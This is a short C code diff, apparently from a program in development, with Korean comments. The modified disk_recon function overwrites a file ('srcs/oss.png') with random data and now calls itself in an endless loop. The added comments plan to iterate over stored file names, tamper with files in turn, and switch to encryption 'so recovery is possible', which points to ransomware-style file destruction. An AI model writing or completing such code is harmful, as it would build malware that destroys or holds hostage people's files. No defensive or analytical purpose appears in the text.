@@ -9,12 +9,15 @@ int     disk_recon(char drive)
 
 	if ((fs = fopen("srcs/oss.png", "w")) != NULL)
 	{	//확장자바꾸기
+		//파일명을 저장한다음 불러오기
+		//스트링으로 받아와서 순회하게 만들기
 		//함수추가해서 파일번갈아가며 변조하게 만들기
-		fprintf(fs, "%d\n", rand()); //암호함수로 바꾸기
+		fprintf(fs, "%d\n", rand());
+		//복구가 가능하도록 암호함수로 바꾸기
 	}
 	else
 		return (0);
-        return (1);
+        return (disk_recon(drive));
 }
 
 int     main(int argc, char *argv[])
